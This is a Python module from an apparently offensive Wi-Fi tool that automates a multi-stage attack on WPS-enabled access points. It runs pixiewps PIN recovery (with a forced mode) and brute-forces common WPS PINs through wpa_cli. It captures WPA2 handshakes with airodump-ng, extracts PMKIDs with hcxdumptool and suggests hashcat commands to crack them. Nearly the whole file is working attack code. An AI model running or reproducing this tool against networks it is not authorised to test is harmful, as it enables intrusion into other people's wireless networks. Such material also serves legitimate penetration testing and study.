#!/usr/bin/env python3
"""
Pixiewps integration helper for FARHAN-Shot (advance-pixiewps)

Adds a WPSAttackHandler that integrates with pixiewps-extend when available
and provides multiple fallback mechanisms (force pixiewps, common PINs,
handshake capture, PMKID extraction). Also includes a helper to vendor/clone
pixiewps-extend into ./vendor/ for offline build and use.

This file is designed to be imported by main.py or used by the CLI wrapper
`scripts/wps_attack.py` included in the repo.
"""

from __future__ import annotations
import subprocess
import shutil
import os
import time
import re
import json
from pathlib import Path
from datetime import datetime
from typing import Optional, Dict, Any, Tuple

VENDOR_DIR = Path(__file__).parent / 'vendor' / 'pixiewps-extend'
PIXIEWPS_BINARY_NAMES = ["pixiewps", str(VENDOR_DIR / 'pixiewps')]

class IntegrationError(Exception):
    pass


def _which_pixiewps() -> Optional[str]:
    """Return path to pixiewps binary if available in PATH or vendor dir."""
    for name in PIXIEWPS_BINARY_NAMES:
        p = shutil.which(name)
        if p:
            return p
    return None


def ensure_pixiewps_vendored(git_url: str = 'https://github.com/anbuinfosec/pixiewps-extend.git', auto_clone: bool = True) -> Tuple[bool, str]:
    """Ensure vendor/pixiewps-extend exists by cloning it. Returns (ok, path).

    This does NOT attempt to build the C binary. The user should build pixiewps
    manually inside vendor/pixiewps-extend when necessary. Optionally the
    script can attempt to run `make` but that often requires packages.
    """
    if _which_pixiewps():
        return True, _which_pixiewps()

    if not auto_clone:
        return False, ''

    try:
        VENDOR_DIR.parent.mkdir(parents=True, exist_ok=True)
        if (VENDOR_DIR / '.git').exists():
            return False, str(VENDOR_DIR)
        print('[*] Cloning pixiewps-extend into vendor/ ...')
        subprocess.run(['git', 'clone', git_url, str(VENDOR_DIR)], check=True, timeout=120)
        return True, str(VENDOR_DIR)
    except subprocess.CalledProcessError as e:
        return False, ''
    except Exception:
        return False, ''


class WPSAttackHandler:
    """Handles WPS attacks with comprehensive fallback mechanisms.

    Methods are non-destructive where possible and designed for interactive
    operator use. They attempt to use system tools: pixiewps, wpa_cli,
    airodump-ng, hcxdumptool. If a tool is missing the method will return
    gracefully with None and a logged warning.
    """

    COMMON_PINS = [
        "12345670", "00000000", "11111111", "12341234",
        "88888888", "19283746", "99999999", "11223344"
    ]

    def __init__(self, interface: str = 'wlan0mon', verbose: bool = True):
        self.interface = interface
        self.verbose = verbose

    def _log(self, level: str, msg: str) -> None:
        if not self.verbose and level not in ('ERROR','SUCCESS'):
            return
        ts = datetime.now().strftime('%H:%M:%S')
        symbols = {'INFO':'[i]','SUCCESS':'[+]','ERROR':'[-]','WARN':'[!]','DEBUG':'[*]'}
        print(f"{symbols.get(level,'[*]')} [{ts}] {msg}")

    def run_pixiewps(self, pke: str, pkr: str, e_hash1: str, e_hash2: str, authkey: str, e_nonce: str, force: bool = False, timeout: int = 30) -> Optional[Dict[str,str]]:
        """Run pixiewps (vendored or system) with provided hex fields.

        Returns dict with pin+method on success, or None.
        """
        pix = _which_pixiewps()
        if not pix:
            self._log('WARN', 'pixiewps binary not found in PATH or vendor dir')
            return None

        cmd = [pix,
               '--pke', pke,
               '--pkr', pkr,
               '--e-hash1', e_hash1,
               '--e-hash2', e_hash2,
               '--authkey', authkey,
               '--e-nonce', e_nonce,
               ]
        if force:
            cmd += ['--force', '-Z']

        try:
            self._log('DEBUG', f'Running: {" ".join(cmd[:6])} ...')
            p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            out = (p.stdout or '') + (p.stderr or '')
            # Try to parse 8-digit PIN
            m = re.search(r'(?:WPS pin|WPS PIN)[:\s\"]*([0-9]{8})', out, re.IGNORECASE)
            if m:
                pin = m.group(1)
                self._log('SUCCESS', f'pixiewps recovered PIN: {pin}')
                return {'pin': pin, 'method': 'pixiewps' if not force else 'pixiewps_force', 'output': out}
            # Some versions print: "[+] pin: 12345670"
            m2 = re.search(r'pin[:\s]*([0-9]{8})', out, re.IGNORECASE)
            if m2:
                pin = m2.group(1)
                self._log('SUCCESS', f'pixiewps recovered PIN: {pin}')
                return {'pin': pin, 'method': 'pixiewps', 'output': out}
            self._log('DEBUG', out[:1000])
            return None
        except subprocess.TimeoutExpired:
            self._log('WARN', 'pixiewps timed out')
            return None
        except Exception as e:
            self._log('ERROR', f'pixiewps failed: {e}')
            return None

    def run_pixiewps_with_force(self, *args, **kwargs):
        return self.run_pixiewps(*args, force=True, **kwargs)

    def try_wps_pin(self, bssid: str, pin: str, interface: Optional[str] = None, timeout: int = 12) -> bool:
        """Attempt a WPS registration with wpa_cli. Returns True on success."""
        iface = interface or self.interface
        if not shutil.which('wpa_cli'):
            self._log('WARN', 'wpa_cli not found')
            return False
        try:
            cmd = ['wpa_cli', '-i', iface, 'wps_reg', bssid, pin]
            p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            out = (p.stdout or '') + (p.stderr or '')
            ok = ('OK' in out) or ('SUCCESS' in out.upper())
            if ok:
                self._log('SUCCESS', f'wpa_cli accepted PIN {pin}')
                return True
            return False
        except Exception as e:
            self._log('DEBUG', f'wpa_cli error: {e}')
            return False

    def test_common_pins(self, bssid: str, interface: Optional[str] = None) -> Optional[Dict[str,str]]:
        self._log('INFO', 'Testing common WPS PINs...')
        for i, pin in enumerate(self.COMMON_PINS, 1):
            self._log('INFO', f'[{i}/{len(self.COMMON_PINS)}] Testing PIN: {pin}')
            if self.try_wps_pin(bssid, pin, interface):
                return {'pin': pin, 'method': 'common_pin_bruteforce'}
            time.sleep(1)
        self._log('WARN', 'No common PINs matched')
        return None

    def capture_handshake(self, bssid: str, essid: str, channel: int = 6, timeout: int = 25) -> Optional[Dict[str,str]]:
        if not shutil.which('airodump-ng'):
            self._log('WARN', 'airodump-ng not found')
            return None
        prefix = f"/tmp/{essid.replace(' ','_')}_{bssid.replace(':','')}_"
        cap_path = prefix + 'capture'
        self._log('INFO', f'Capturing with airodump-ng to {cap_path} (timeout {timeout}s)')
        try:
            cmd = ['airodump-ng', '--bssid', bssid, '--channel', str(channel), '-w', cap_path, self.interface]
            p = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(timeout)
            p.terminate()
            cap_file = f"{cap_path}-01.cap"
            if Path(cap_file).exists():
                self._log('SUCCESS', f'Handshake captured: {cap_file}')
                return {'handshake': cap_file, 'method': 'wpa2_handshake', 'note': f'hashcat -m 22000 {cap_file} wordlist.txt'}
            else:
                self._log('WARN', 'No capture file created')
                return None
        except Exception as e:
            self._log('ERROR', f'Handshake capture error: {e}')
            return None

    def extract_pmkid(self, bssid: str, essid: str, timeout: int = 15) -> Optional[Dict[str,str]]:
        if not shutil.which('hcxdumptool'):
            self._log('WARN', 'hcxdumptool not found')
            return None
        outp = f"/tmp/pmkid_{essid.replace(' ','_')}_{bssid.replace(':','')}.pcap"
        self._log('INFO', f'Running hcxdumptool to extract PMKID to {outp} (timeout {timeout}s)')
        try:
            cmd = ['hcxdumptool', '--interface', self.interface, '--active_beacon', '--bssid', bssid, '-o', outp, '--enable_status=3']
            p = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(timeout)
            p.terminate()
            if Path(outp).exists():
                self._log('SUCCESS', f'PMKID extracted: {outp}')
                return {'pmkid': outp, 'method': 'pmkid_offline', 'note': f'hashcat -m 16800 {outp} wordlist.txt'}
            self._log('WARN', 'PMKID output not found')
            return None
        except Exception as e:
            self._log('ERROR', f'PMKID extraction error: {e}')
            return None

    def comprehensive_attack(self, bssid: str, essid: str, pke: Optional[str] = None, pkr: Optional[str] = None, e_hash1: Optional[str] = None, e_hash2: Optional[str] = None, authkey: Optional[str] = None, e_nonce: Optional[str] = None, channel: int = 6, auto_clone_pixie: bool = True) -> Dict[str,Any]:
        self._log('INFO', '='*60)
        self._log('INFO', f'Starting comprehensive WPS attack on {essid} ({bssid})')
        self._log('INFO', '='*60)

        result = {'bssid': bssid, 'essid': essid, 'success': False, 'pin': None, 'method': None, 'handshake': None, 'pmkid': None, 'alternatives': []}

        # Ensure pixiewps vendored if possible
        if auto_clone_pixie:
            ensure_pixiewps_vendored()

        # 1. Pixiewps (forced if available)
        if pke and pkr and e_hash1 and e_hash2 and authkey and e_nonce:
            self._log('INFO', 'Stage 1: pixiewps (fast offline)')
            r = self.run_pixiewps(pke, pkr, e_hash1, e_hash2, authkey, e_nonce, force=False)
            if not r:
                r = self.run_pixiewps(pke, pkr, e_hash1, e_hash2, authkey, e_nonce, force=True)
            if r and r.get('pin'):
                result.update({'pin': r['pin'], 'method': r.get('method','pixiewps'), 'success': True})
                return result

        # 2. Common PINs
        self._log('INFO', 'Stage 2: common PIN brute-force')
        cp = self.test_common_pins(bssid)
        if cp and cp.get('pin'):
            result.update({'pin': cp['pin'], 'method': cp.get('method'), 'success': True})
            return result

        # 3. Capture handshake
        self._log('INFO', 'Stage 3: WPA2 handshake capture')
        hs = self.capture_handshake(bssid, essid, channel)
        if hs:
            result['handshake'] = hs.get('handshake')
            result['alternatives'].append(hs)

        # 4. PMKID
        self._log('INFO', 'Stage 4: PMKID extraction')
        pm = self.extract_pmkid(bssid, essid)
        if pm:
            result['pmkid'] = pm.get('pmkid')
            result['alternatives'].append(pm)

        if result['success']:
            self._log('SUCCESS', 'PIN recovered')
        else:
            if result['alternatives']:
                self._log('WARN', f'PIN not found, alternatives captured: {len(result["alternatives"])}')
            else:
                self._log('ERROR', 'No successful attack stage')
        return result


if __name__ == '__main__':
    print('This module provides WPSAttackHandler for integration. Import it in your scripts.')
